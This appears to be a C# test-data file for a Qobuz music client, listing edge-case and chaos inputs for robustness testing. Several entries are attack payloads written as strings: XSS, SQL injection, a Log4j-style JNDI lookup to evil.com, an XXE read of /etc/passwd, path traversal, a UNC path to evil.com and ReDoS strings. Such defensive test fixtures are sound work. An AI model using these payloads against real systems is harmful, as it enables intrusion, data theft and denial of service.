                    .WithId("script_injection")
                    .WithTitle("<script>alert('xss')</script>")
                    .WithPerformer("javascript:alert('pwned')")
                    .Build(),
                
                // Mathematical edge cases
                QobuzTrackBuilder.New()
                    .WithId("math_chaos")
                    .WithTitle("Math Chaos")
                    .WithQuality(int.MinValue, double.NaN)
                    .WithDuration(int.MinValue)
                    .Build()
            };

        /// <summary>
        /// Chaos monkey file paths designed to break file system operations
        /// </summary>
        public static IEnumerable<object[]> ChaosMonkeyFilePaths =>
            new List<object[]>
            {
                // Reserved Windows names
                new object[] { "CON.flac", "WindowsReservedCON" },
                new object[] { "PRN.mp3", "WindowsReservedPRN" },
                new object[] { "AUX.wav", "WindowsReservedAUX" },
                new object[] { "NUL.flac", "WindowsReservedNUL" },
                new object[] { "COM1.flac", "WindowsReservedCOM1" },
                new object[] { "LPT1.flac", "WindowsReservedLPT1" },
                
                // Path length bombs
                new object[] { new string('A', 1000) + ".flac", "PathLengthBomb" },
                new object[] { string.Join("\\", Enumerable.Repeat("dir", 100)) + "\\file.flac", "DeepDirectoryNesting" },
                
                // Unicode file names
                new object[] { "🎵🎶🎼.flac", "EmojiFileName" },
                new object[] { "файл.flac", "CyrillicFileName" },
                new object[] { "文件.flac", "ChineseFileName" },
                new object[] { "\u202Ereversed.flac", "BidirectionalOverrideFileName" },
                
                // Control characters in paths
                new object[] { "file\u0000.flac", "NullByteFileName" },
                new object[] { "file\u0001\u0002\u0003.flac", "ControlCharFileName" },
                new object[] { "file\r\n.flac", "CRLFFileName" },
                
                // All illegal characters at once
                new object[] { "file<>:\"|?*.flac", "AllIllegalChars" },
                
                // Case sensitivity chaos
                new object[] { "FILE.FLAC", "AllUppercaseExtension" },
                new object[] { "file.FlAc", "MixedCaseExtension" },
                
                // Multiple extensions
                new object[] { "file.tar.gz.flac.exe.bat", "MultipleExtensions" },
                
                // Spaces and dots
                new object[] { " .flac", "SpaceDotFileName" },
                new object[] { "file .flac", "TrailingSpaceFileName" },
                new object[] { "file..flac", "DoubleDotFileName" },
                new object[] { "...flac", "TripleDotFileName" },
                
                // Symlink attempts
                new object[] { "/dev/null", "DevNullPath" },
                new object[] { "/proc/self/mem", "ProcMemPath" },
                
                // Network paths
                new object[] { "\\\\server\\share\\file.flac", "UNCPath" },
                new object[] { "smb://server/share/file.flac", "SMBPath" },
                
                // URL-like paths
                new object[] { "http://evil.com/file.flac", "HTTPPath" },
                new object[] { "file://c:/windows/system32/file.flac", "FileURLPath" },
                
                // Very long extension
                new object[] { "file." + new string('a', 100), "LongExtension" },
                
                // No extension, just dots
                new object[] { "file.", "EmptyExtension" },
                new object[] { "file...", "MultipleEmptyExtensions" },
                
                // Binary data as filename
                new object[] { Convert.ToBase64String(new byte[100]), "Base64FileName" },
                
                // Path injection
                new object[] { "../../../music/file.flac", "RelativePathInjection" },
                new object[] { "C:\\Windows\\System32\\file.flac", "AbsolutePathInjection" },
                
                // Zip bomb file name
                new object[] { new string('A', 10000) + ".zip.flac", "ZipBombFileName" }
            };

        /// <summary>
        /// Chaos monkey network conditions designed to test resilience
        /// </summary>
        public static IEnumerable<object[]> ChaosMonkeyNetworkConditions =>
            new List<object[]>
            {
                // Extreme timeouts
                new object[] { 0, "ZeroTimeout" },
                new object[] { 1, "OneMillisecondTimeout" },
                new object[] { int.MaxValue, "MaxIntTimeout" },
                new object[] { -1, "NegativeTimeout" },
                
                // Extreme response sizes
                new object[] { long.MaxValue, "MaxLongResponseSize" },
                new object[] { -1L, "NegativeResponseSize" },
                new object[] { 0L, "ZeroResponseSize" },
                
                // Rate limiting chaos
                new object[] { 0, "ZeroRateLimit" },
                new object[] { int.MaxValue, "UnlimitedRate" },
                new object[] { -100, "NegativeRateLimit" },
                
                // Connection chaos
                new object[] { 65536, "TooManyConnections" }, // Above typical port limit
                new object[] { 0, "NoConnections" }
            };

        /// <summary>
        /// Chaos monkey date/time scenarios designed to break temporal logic
        /// </summary>
        public static IEnumerable<object[]> ChaosMonkeyDateTimes =>
            new List<object[]>
            {
                // Time overflow scenarios
                new object[] { DateTime.MaxValue, "MaxDateTime" },
                new object[] { DateTime.MinValue, "MinDateTime" },
                new object[] { new DateTime(1, 1, 1), "YearOne" },
                new object[] { new DateTime(9999, 12, 31), "YearNineThousandNineNinetyNine" },
                
                // Unix timestamp edge cases
                new object[] { new DateTime(1970, 1, 1), "UnixEpochStart" },
                new object[] { new DateTime(2038, 1, 19, 3, 14, 7), "Unix32BitOverflow" },
                new object[] { new DateTime(1901, 12, 13, 20, 45, 52), "Unix32BitUnderflow" },
                new object[] { new DateTime(2106, 2, 7, 6, 28, 15), "UnixTimestampMax" },
                
                // Leap year chaos
                new object[] { new DateTime(2000, 2, 29), "Y2KLeapDay" },
                new object[] { new DateTime(1900, 2, 28), "NonLeapCenturyEnd" },
                new object[] { new DateTime(2100, 2, 28), "NextNonLeapCenturyEnd" },
                
                // DST transition times
                new object[] { new DateTime(2023, 3, 12, 2, 30, 0), "DSTSpringForward" },
                new object[] { new DateTime(2023, 11, 5, 1, 30, 0), "DSTFallBack" },
                
                // Time zone chaos
                new object[] { new DateTime(2023, 1, 1, 12, 0, 0, DateTimeKind.Utc), "UTC" },
                new object[] { new DateTime(2023, 1, 1, 12, 0, 0, DateTimeKind.Local), "LocalTime" },
                new object[] { new DateTime(2023, 1, 1, 12, 0, 0, DateTimeKind.Unspecified), "UnspecifiedKind" },
                
                // Millisecond precision chaos
                new object[] { new DateTime(2023, 1, 1, 12, 0, 0, 999), "MaxMilliseconds" },
                new object[] { new DateTime(2023, 1, 1, 12, 0, 0, 0), "ZeroMilliseconds" },
                
                // Far future dates
                new object[] { DateTime.Now.AddYears(1000), "OneThousandYearsInFuture" },
                new object[] { new DateTime(9998, 12, 31), "MaxSafeFutureDate" },
                
                // Historical edge cases
                new object[] { new DateTime(1582, 10, 15), "GregorianCalendarStart" },
                new object[] { new DateTime(1066, 10, 14), "BattleOfHastings" },
                
                // Computer epoch dates
                new object[] { new DateTime(1980, 1, 1), "DOSEpoch" },
                new object[] { new DateTime(1904, 1, 1), "MacEpoch" },
                new object[] { new DateTime(1601, 1, 1), "WindowsFileTimeEpoch" }
            };

        /// <summary>
        /// Chaos monkey audio quality specifications for stress testing
        /// </summary>
        public static IEnumerable<object[]> ChaosMonkeyAudioQualities =>
            new List<object[]>
            {
                // Bit depth chaos
                new object[] { int.MaxValue, 44100.0, "MaxBitDepth" },
                new object[] { int.MinValue, 44100.0, "MinBitDepth" },
                new object[] { 0, 44100.0, "ZeroBitDepth" },
                new object[] { -1, 44100.0, "NegativeBitDepth" },
                new object[] { 1, 44100.0, "OneBitDepth" },
                new object[] { 128, 44100.0, "ExcessiveBitDepth" },
                
                // Sample rate chaos
                new object[] { 24, double.MaxValue, "MaxSampleRate" },
                new object[] { 24, double.MinValue, "MinSampleRate" },
                new object[] { 24, 0.0, "ZeroSampleRate" },
                new object[] { 24, -44100.0, "NegativeSampleRate" },
                new object[] { 24, double.PositiveInfinity, "InfiniteSampleRate" },
                new object[] { 24, double.NegativeInfinity, "NegativeInfiniteSampleRate" },
                new object[] { 24, double.NaN, "NaNSampleRate" },
                new object[] { 24, 1.0, "OneSampleRate" },
                new object[] { 24, 1000000.0, "OneMillionSampleRate" },
                
                // Combined chaos
                new object[] { -1, -1.0, "BothNegative" },
                new object[] { 0, 0.0, "BothZero" },
                new object[] { int.MaxValue, double.MaxValue, "BothMaximum" },
                new object[] { int.MinValue, double.MinValue, "BothMinimum" }
            };

        #endregion

        /// <summary>
        /// Gets all edge case data collections for comprehensive testing
        /// </summary>
        public static Dictionary<string, IEnumerable<object[]>> AllEdgeCases =>
            new Dictionary<string, IEnumerable<object[]>>
            {
                { "SearchQueries", SearchQueryEdgeCases },
                { "AlbumTitles", AlbumTitleEdgeCases },
                { "ArtistNames", ArtistNameEdgeCases },
                { "TrackTitles", TrackTitleEdgeCases },
                { "AudioQualities", AudioQualityEdgeCases },
                { "DateTimes", DateTimeEdgeCases },
                { "FilePaths", FilePathEdgeCases },
                { "NetworkConditions", NetworkEdgeCases },
                { "BoundaryValues", BoundaryValues }
            };

        /// <summary>
        /// Gets all chaos monkey edge case collections for extreme testing
        /// </summary>
        public static Dictionary<string, IEnumerable<object[]>> ChaosMonkeyEdgeCases =>
            new Dictionary<string, IEnumerable<object[]>>
            {
                { "ChaosSearchQueries", ChaosMonkeySearchQueries },
                { "ChaosFilePaths", ChaosMonkeyFilePaths },
                { "ChaosNetworkConditions", ChaosMonkeyNetworkConditions },
                { "ChaosDateTimes", ChaosMonkeyDateTimes },
                { "ChaosAudioQualities", ChaosMonkeyAudioQualities }
            };

        /// <summary>
        /// Gets ALL edge cases including both normal and chaos monkey scenarios
        /// </summary>
        public static Dictionary<string, IEnumerable<object[]>> AllEdgeCasesIncludingChaos
        {
            get
            {
                var combined = new Dictionary<string, IEnumerable<object[]>>(AllEdgeCases);
                foreach (var chaosCase in ChaosMonkeyEdgeCases)
                {
                    combined[chaosCase.Key] = chaosCase.Value;
                }
                return combined;
            }
        }

        /// <summary>
        /// Gets a random sample of edge cases for property-based testing
        /// </summary>
        public static IEnumerable<object[]> GetRandomSample(string category, int sampleSize)
        {
            if (!AllEdgeCases.ContainsKey(category))
                return Enumerable.Empty<object[]>();
                
            var random = new Random(42); // Fixed seed for reproducible tests
            return AllEdgeCases[category]
                .OrderBy(x => random.Next())
                .Take(sampleSize);
        }

        /// <summary>
        /// Gets edge cases suitable for stress testing
        /// </summary>
        public static IEnumerable<object[]> GetStressTestCases()
        {
            return SearchQueryEdgeCases
                .Where(x => x[1].ToString().Contains("Long") || 
                           x[1].ToString().Contains("Unicode") ||
                           x[1].ToString().Contains("Complex"))
                .Take(20);
        }

        /// <summary>
        /// Gets chaos monkey cases for extreme stress testing 🐒💥
        /// WARNING: These may cause memory exhaustion, timeouts, or other resource issues!
        /// </summary>
        public static IEnumerable<object[]> GetChaosMonkeyCases(int maxCount = 10)
        {
            var random = new Random(666); // Devil's seed for chaos! 👹
            return ChaosMonkeySearchQueries
                .OrderBy(x => random.Next())
                .Take(maxCount);
        }

        /// <summary>
        /// Gets the most dangerous chaos monkey cases - USE WITH EXTREME CAUTION! ⚠️💀
        /// These are specifically designed to test system limits and may cause:
        /// - OutOfMemoryExceptions
        /// - StackOverflowExceptions
        /// - Timeouts
        /// - Thread exhaustion
        /// - File system errors
        /// </summary>
        public static IEnumerable<object[]> GetDangerousChaosMonkeyCases()
        {
            return ChaosMonkeySearchQueries
                .Where(x => x[1].ToString().Contains("Memory") || 
                           x[1].ToString().Contains("Bomb") ||
                           x[1].ToString().Contains("Overflow") ||
                           x[1].ToString().Contains("Exhaustion") ||
                           x[1].ToString().Contains("Massive"))
                .Take(5); // Limit to 5 for safety
        }

        /// <summary>
        /// Gets security-focused chaos monkey cases for penetration testing
        /// </summary>
        public static IEnumerable<object[]> GetSecurityChaosMonkeyCases()
        {
            return ChaosMonkeySearchQueries
                .Where(x => x[1].ToString().Contains("Injection") || 
                           x[1].ToString().Contains("XSS") ||
                           x[1].ToString().Contains("SQL") ||
                           x[1].ToString().Contains("Attack") ||
                           x[1].ToString().Contains("Traversal"))
                .Take(15);
        }

        /// <summary>
        /// Gets Unicode and encoding chaos cases for internationalization testing
        /// </summary>
        public static IEnumerable<object[]> GetUnicodeChaosMonkeyCases()
        {
            return ChaosMonkeySearchQueries
                .Where(x => x[1].ToString().Contains("Unicode") || 
                           x[1].ToString().Contains("Character") ||
                           x[1].ToString().Contains("Encoding") ||
                           x[1].ToString().Contains("Surrogate"))
                .Take(20);
        }

        /// <summary>
        /// Gets performance degradation cases for load testing
        /// </summary>
        public static IEnumerable<object[]> GetPerformanceChaosMonkeyCases()
        {
            return ChaosMonkeySearchQueries
                .Where(x => x[1].ToString().Contains("Regex") || 
                           x[1].ToString().Contains("Backtracking") ||
                           x[1].ToString().Contains("Nested") ||
                           x[1].ToString().Contains("Timing"))
                .Take(10);
        }

        /// <summary>
        /// Creates a chaos monkey metadata track with extreme properties
        /// </summary>
        public static QobuzTrack CreateChaosMonkeyTrack(string chaosType)
        {
            return chaosType switch
            {
                "MemoryBomb" => ChaosMonkeyMetadata.First(t => t.Id == "memory_bomb"),
                "UnicodeChaos" => ChaosMonkeyMetadata.First(t => t.Id == "unicode_chaos"),
                "ControlChaos" => ChaosMonkeyMetadata.First(t => t.Id == "control_chaos"),
                "QualityChaos" => ChaosMonkeyMetadata.First(t => t.Id == "quality_chaos"),
                "NegativeTrack" => ChaosMonkeyMetadata.First(t => t.Id == "negative_track"),
                "ZeroTrack" => ChaosMonkeyMetadata.First(t => t.Id == "zero_track"),
                "FormatInjection" => ChaosMonkeyMetadata.First(t => t.Id == "format_injection"),
                "PathInjection" => ChaosMonkeyMetadata.First(t => t.Id == "path_injection"),
                "ScriptInjection" => ChaosMonkeyMetadata.First(t => t.Id == "script_injection"),
                "MathChaos" => ChaosMonkeyMetadata.First(t => t.Id == "math_chaos"),
                _ => ChaosMonkeyMetadata.First() // Default to first chaos track
            };
        }

        /// <summary>
        /// Generates a batch of chaos monkey test data for concurrent testing
        /// </summary>
        public static IEnumerable<object[]> GenerateConcurrentChaosTestData(int batchSize = 50)
        {
            var random = new Random(42);
            var allChaos = ChaosMonkeySearchQueries.ToList();
            
            for (int i = 0; i < batchSize; i++)
            {
                var randomChaos = allChaos[random.Next(allChaos.Count)];
                yield return new object[] { randomChaos[0], randomChaos[1], i };
            }
        }

        #region Expert-Level Chaos Monkey Cases 💀🔥

        /// <summary>
        /// ⚠️ EXPERT-LEVEL CHAOS MONKEY CASES ⚠️
        /// 
        /// These are the most diabolical edge cases designed by expert researchers
        /// to break metadata sanitization, Unicode processing, and file system operations.
        /// 
        /// 🚨 EXTREME CAUTION REQUIRED 🚨
        /// - May cause system crashes
        /// - May exhaust memory/CPU resources  
        /// - May trigger security vulnerabilities
        /// - May break audio processing libraries
        /// - Only use in isolated test environments
        /// 
        /// Created based on research into real-world attack vectors and edge cases
        /// that have broken production systems.
        /// </summary>
        public static IEnumerable<object[]> ExpertLevelChaosQueries =>
            new List<object[]>
            {
                #region Unicode Normalization Attacks
                // These exploit Unicode normalization vulnerabilities
                new object[] { "café", "UnicodeNormNFC" },  // NFC form
                new object[] { "cafe\u0301", "UnicodeNormNFD" },  // NFD form (e + combining acute)
                new object[] { "A\u030A", "UnicodeDecomposed" },  // A + combining ring above
                new object[] { "Å", "UnicodePrecomposed" },  // Precomposed A with ring
                new object[] { "ﬃ", "UnicodeLigature" },  // Single ligature character
                new object[] { "ffi", "UnicodeExpanded" },  // Expanded form
                new object[] { "℃", "UnicodeSingleChar" },  // Degree celsius as single char
                new object[] { "°C", "UnicodeMultiChar" },  // Degree + C as separate chars
                
                #endregion

                #region Unpaired Surrogate Attacks
                // These break UTF-16 processing and can crash parsers
                new object[] { "Track\uD800", "UnpairedHighSurrogate" },  // High surrogate without low
                new object[] { "Album\uDC00", "UnpairedLowSurrogate" },   // Low surrogate without high
                new object[] { "Band\uD800\uD800", "DoubleHighSurrogate" }, // Two high surrogates
                new object[] { "Song\uDC00\uDC00", "DoubleLowSurrogate" },  // Two low surrogates
                new object[] { "Artist\uDC00\uD800", "ReversedSurrogates" }, // Reversed order
                
                #endregion

                #region Directional Override Attacks
                // These can completely reverse text display and break parsing
                new object[] { "Track\u202E\u202Dmean\u202C", "BidirectionalOverride" },
                new object[] { "Album\u200E\u200F\u061C", "DirectionalMarks" },
                new object[] { "\u202Eevil\u202Dtrack\u202C", "RightToLeftOverride" },
                new object[] { "Song\u2066hidden\u2069text", "DirectionalIsolation" },
                
                #endregion

                #region Format String Exploitation
                // These attempt to exploit format string vulnerabilities
                new object[] { "%n%n%n%n%n%n%n%n%n%n", "FormatStringExploit" },
                new object[] { "{0:X}{1:X}{2:X}{3:X}{4:X}", "DotNetFormatExploit" },
                new object[] { "${jndi:ldap://evil.com/}", "Log4jStyleExploit" },
                new object[] { "Track %*%*%*%*%*%*%*%*%*%s", "CFormatExploit" },
                new object[] { "\\u0000\\u0001\\u0002", "EscapeSequenceExploit" },
                
                #endregion

                #region Database Injection Attempts
                // These test SQL injection resistance
                new object[] { "'; DROP TABLE tracks; --", "SQLDropTable" },
                new object[] { "Track') UNION SELECT password FROM users--", "SQLUnionInjection" },
                new object[] { "Album\"; DELETE FROM albums WHERE \"1\"=\"1", "SQLDeleteInjection" },
                new object[] { "Song' OR '1'='1' OR '", "SQLTautologyInjection" },
                new object[] { "Band\x00'; WAITFOR DELAY '00:00:10'; --", "SQLTimingInjection" },
                
                #endregion

                #region XML/JSON Parser Breaking
                // These break structured data parsing
                new object[] { "Track\\\":\\\"\\\"\\,\\\"admin\\\":true\\,\\\"query\\\":\\\"", "JSONInjectionExploit" },
                new object[] { "</title><script>alert('xss')</script><title>", "XMLTagInjection" },
                new object[] { "Album&lt;script&gt;alert('xss')&lt;/script&gt;", "HTMLEntityInjection" },
                new object[] { "<?xml version=\\\"1.0\\\"?><!DOCTYPE song [<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">]>", "XXEInjectionAttempt" },
                
                #endregion

                #region Regex DoS (ReDoS) Patterns
                // These cause catastrophic backtracking in regex engines
                new object[] { new string('a', 5000) + "!" + new string('b', 5000), "RegexAlternationBomb" },
                new object[] { new string('a', 1000) + "X", "RegexBacktrackingBomb" },
                new object[] { string.Concat(Enumerable.Repeat("(a+)+", 50)) + new string('a', 100) + "X", "RegexNestedQuantifierBomb" },
                new object[] { new string('a', 10000), "RegexLinearBomb" },
                
                #endregion

                #region Container Format Confusion
                // These test file format detection robustness
                new object[] { "fLaC", "FLACMagicMimic" },      // Mimics FLAC magic number
                new object[] { "ID3", "MP3MagicMimic" },        // Mimics MP3 ID3 tag
                new object[] { "OggS", "OggMagicMimic" },       // Mimics Ogg container
                new object[] { "RIFF", "WAVMagicMimic" },       // Mimics WAV/RIFF format
                new object[] { "ftypM4A", "M4AMagicMimic" },    // Mimics M4A container
                
                #endregion

                #region Memory Exhaustion Patterns
                // These attempt to exhaust system memory through metadata
                new object[] { string.Concat(Enumerable.Repeat("🎵", 25000)), "UnicodeMemoryBomb" },  // 25K music note emojis
                new object[] { string.Concat(Enumerable.Repeat("Test ", 50000)), "RepeatedWordBomb" },
                new object[] { Convert.ToBase64String(new byte[32768]), "Base64Bomb" },
                new object[] { string.Join("", Enumerable.Range(0, 10000).Select(i => i.ToString())), "NumberSequenceBomb" },
                
                #endregion

                #region Null/Control Character Injection
                // These test null byte and control character handling
                new object[] { "Track\x00\x01\xFF\xFE", "NullByteInjection" },
                new object[] { "Title\uFFFE\uFFFF", "NonCharacterInjection" },
                new object[] { "Song\x1b[31mRED\x1b[0m", "ANSIEscapeInjection" },
                new object[] { "Album\x07\x07\x07", "BellCharacterBomb" },
                new object[] { "Band\x0C\x0C\x0C", "FormFeedBomb" },
                
                #endregion
            };

        /// <summary>
        /// Expert-level chaos monkey file paths that exploit Windows file system vulnerabilities
        /// </summary>
        public static IEnumerable<object[]> ExpertLevelChaosFilePaths =>
            new List<object[]>
            {
                #region Windows Long Path Exploitation
                // These test Windows path length limits and long path handling
                new object[] { "\\\\?\\" + string.Concat(Enumerable.Repeat("A\\", 1000)) + "song.flac", "UNCLongPathExploit" },
                new object[] { "C:\\" + new string('A', 32700) + ".flac", "MaxPathLengthExploit" },
                new object[] { "\\\\server\\" + string.Concat(Enumerable.Repeat("share\\", 500)) + "file.flac", "DeepUNCNesting" },
                new object[] { "\\\\localhost\\c$\\" + new string('x', 1000) + "\\track.mp3", "LocalhostUNCExploit" },
                
                #endregion

                #region NTFS Alternate Data Stream Exploitation
                // These test NTFS ADS vulnerabilities
                new object[] { "song.flac:hidden:$DATA", "AlternateDataStream" },
                new object[] { "album.m4a::$INDEX_ALLOCATION", "IndexAllocationStream" },
                new object[] { "track.mp3:Zone.Identifier:$DATA", "ZoneIdentifierStream" },
                new object[] { "music.wav:$bitmap:$DATA", "BitmapDataStream" },
                new object[] { "audio.flac:evil.exe:$DATA", "ExecutableHiddenStream" },
                
                #endregion

                #region Junction Point/Symlink Exploitation
                // These test symbolic link and junction point handling
                new object[] { "C:\\Music\\..\\..\\..\\Windows\\System32\\calc.exe", "DirectoryTraversalExploit" },
                new object[] { "\\\\?\\C:\\Music\\junction\\..\\sensitive\\data.flac", "JunctionPointExploit" },
                new object[] { "\\\\?\\C:\\$Recycle.Bin\\music.flac", "RecycleBinExploit" },
                new object[] { "C:\\Music\\desktop.ini\\..\\autorun.inf", "AutorunExploit" },
                
                #endregion

                #region Case Sensitivity Exploitation
                // These test case sensitivity handling on Windows
                new object[] { "CON.flac", "ReservedNameUpperCase" },
                new object[] { "con.FLAC", "ReservedNameMixedCase" },
                new object[] { "Con.Flac", "ReservedNameTitleCase" },
                new object[] { "TRACK.MP3", "AllUpperCaseExtension" },
                new object[] { "track.MP3", "MixedCaseExtension" },
                
                #endregion

                #region 8.3 Filename Generation Exploitation
                // These test short filename generation issues
                new object[] { "AVERYLONGFILENAMETHATEXCEEDSEIGHTCHARACTERS~1.FLAC", "EightDotThreeExploit" },
                new object[] { "PROGRA~1\\COMMON~1\\file.mp3", "ShortNamePathExploit" },
                new object[] { "LONGFI~1.FLAC", "ShortNameCollision" },
                
                #endregion

                #region Unicode File Name Exploitation
                // These test Unicode filename handling
                new object[] { "file\u202E\u202Dgnos\u202C.flac", "BidirectionalFileNameExploit" },
                new object[] { "track\uFEFF.mp3", "BOMInFileName" },
                new object[] { "song\u0000.flac", "NullByteInFileName" },
                new object[] { "album\uD800\uDC00.m4a", "SurrogateInFileName" },
                
                #endregion

                #region Network Path Exploitation
                // These test network path handling
                new object[] { "\\\\evil.com\\share\\malware.flac", "MaliciousUNCPath" },
                new object[] { "\\\\127.0.0.1\\c$\\Windows\\System32\\file.mp3", "LoopbackUNCExploit" },
                new object[] { "\\\\?\\UNC\\server\\share\\file.flac", "UNCPrefixExploit" },
                
                #endregion
            };

        /// <summary>
        /// Expert-level metadata bombs designed to test parsing robustness
        /// </summary>
        public static IEnumerable<QobuzTrack> ExpertLevelMetadataBombs =>
            new List<QobuzTrack>
            {
                // Unicode normalization confusion track
                new QobuzTrack
                {
                    Id = "unicode_norm_bomb",
                    Title = "café", // NFC form
                    Performer = new QobuzArtist { Name = "cafe\u0301" }, // NFD form - looks same but different bytes
                    TrackNumber = 1,
                    DurationSeconds = 180,
                    MaximumBitDepth = 24,
                    MaximumSampleRate = 96000,
                    Downloadable = true,
                    Streamable = true
                },

                // Surrogate pair bomb
                new QobuzTrack
                {
                    Id = "surrogate_bomb",
                    Title = "Track\uD800\uDC00\uD801\uDC01", // Valid surrogate pairs
                    Performer = new QobuzArtist { Name = "Artist\uD800" }, // Unpaired high surrogate
                    TrackNumber = 2,
                    DurationSeconds = 240,
                    MaximumBitDepth = 24,
                    MaximumSampleRate = 192000,
                    Downloadable = false, // Not downloadable due to malformed metadata
                    Streamable = false
                },

                // Format string exploitation attempt
                new QobuzTrack
                {
                    Id = "format_string_bomb",
                    Title = "%n%n%n%n%n%n%n%n%n%n",
                    Performer = new QobuzArtist { Name = "{0:X}{1:X}{2:X}{3:X}" },
                    TrackNumber = 3,
                    DurationSeconds = 300,
                    MaximumBitDepth = 32, // Invalid bit depth
                    MaximumSampleRate = double.PositiveInfinity, // Invalid sample rate
                    Downloadable = true,
                    Streamable = true
                },

                // Regex DoS metadata bomb
                new QobuzTrack
                {
                    Id = "regex_dos_bomb",
                    Title = new string('a', 10000) + "X", // Causes catastrophic backtracking
                    Performer = new QobuzArtist { Name = string.Concat(Enumerable.Repeat("(a+)+", 20)) + "test" },
                    TrackNumber = 4,
                    DurationSeconds = int.MaxValue, // Impossible duration
                    MaximumBitDepth = -1, // Negative bit depth
                    MaximumSampleRate = 0, // Zero sample rate
                    Downloadable = true,
                    Streamable = true
                },

                // Memory exhaustion metadata
                new QobuzTrack
                {
                    Id = "memory_exhaustion_bomb",
                    Title = string.Concat(Enumerable.Repeat("🎵", 50000)), // 50K Unicode music notes (200KB+ in UTF-8)
                    Performer = new QobuzArtist { Name = Convert.ToBase64String(new byte[65536]) }, // 64KB Base64
                    TrackNumber = 5,
                    DurationSeconds = 1800,
                    MaximumBitDepth = 24,
                    MaximumSampleRate = 96000,
                    Downloadable = true,
                    Streamable = true
                }
            };

        /// <summary>
        /// Expert-level audio specification chaos designed to break audio processing
        /// </summary>
        public static IEnumerable<object[]> ExpertLevelAudioChaos =>
            new List<object[]>
            {
                // Impossible bit depths
                new object[] { -1, 44100.0, "NegativeBitDepth" },
                new object[] { 0, 44100.0, "ZeroBitDepth" },
                new object[] { int.MaxValue, 44100.0, "MaxIntBitDepth" },
                new object[] { 1, 44100.0, "OneBitDepth" },
                new object[] { 3, 44100.0, "ThreeBitDepth" }, // Not power of 2
                
                // Impossible sample rates
                new object[] { 24, -1.0, "NegativeSampleRate" },
                new object[] { 24, 0.0, "ZeroSampleRate" },
                new object[] { 24, double.PositiveInfinity, "InfiniteSampleRate" },
                new object[] { 24, double.NaN, "NaNSampleRate" },
                new object[] { 24, double.MaxValue, "MaxDoubleSampleRate" },
                new object[] { 24, 1.5, "FractionalSampleRate" },
                new object[] { 24, uint.MaxValue, "MaxUIntSampleRate" },
                
                // Extreme valid ranges
                new object[] { 1, 1.0, "MinimalAudio" },
                new object[] { 64, 1000000.0, "ExtremeHighRes" },
                new object[] { 32, 384000.0, "UltraHighSampleRate" },
                
                // Channel confusion
                new object[] { 24, 44100.0, "MonoAsChannelCount", 1 },
                new object[] { 24, 44100.0, "MaxIntChannels", int.MaxValue },
                new object[] { 24, 44100.0, "NegativeChannels", -1 },
                new object[] { 24, 44100.0, "ZeroChannels", 0 }
            };

        /// <summary>
        /// Gets expert-level chaos monkey cases - THE MOST DANGEROUS TESTS! ☠️⚡
        /// 
        /// ⚠️ WARNING: EXPERTS ONLY ⚠️
        /// These cases were designed by security researchers and can:
        /// • Crash applications
        /// • Exhaust system resources
        /// • Trigger security vulnerabilities
        /// • Break Unicode processing
        /// • Exploit file system weaknesses
        /// • Cause indefinite hangs
        /// 
        /// Only use in completely isolated test environments!
        /// </summary>
        public static IEnumerable<object[]> GetExpertLevelChaosMonkeyCases(int maxCount = 5)
        {
            return ExpertLevelChaosQueries
                .Take(Math.Min(maxCount, 5)) // Limit to 5 for safety
                .ToList();
        }

        /// <summary>
        /// Gets expert-level Unicode attack vectors
        /// </summary>
        public static IEnumerable<object[]> GetUnicodeAttackCases()
        {
            return ExpertLevelChaosQueries
                .Where(x => x[1].ToString().Contains("Unicode") || 
                           x[1].ToString().Contains("Surrogate") ||
                           x[1].ToString().Contains("Bidirectional"))
                .Take(10);
        }

        /// <summary>
        /// Gets expert-level format exploitation attempts
        /// </summary>
        public static IEnumerable<object[]> GetFormatExploitationCases()
        {
            return ExpertLevelChaosQueries
                .Where(x => x[1].ToString().Contains("Format") || 
                           x[1].ToString().Contains("Injection") ||
                           x[1].ToString().Contains("Exploit"))
                .Take(10);
        }

        /// <summary>
        /// Gets expert-level file system exploitation cases
        /// </summary>
        public static IEnumerable<object[]> GetFileSystemExploitCases()
        {
            return ExpertLevelChaosFilePaths
                .Where(x => x[1].ToString().Contains("Exploit") || 
                           x[1].ToString().Contains("Stream") ||
                           x[1].ToString().Contains("Path"))
                .Take(10);
        }

        #endregion
    }
}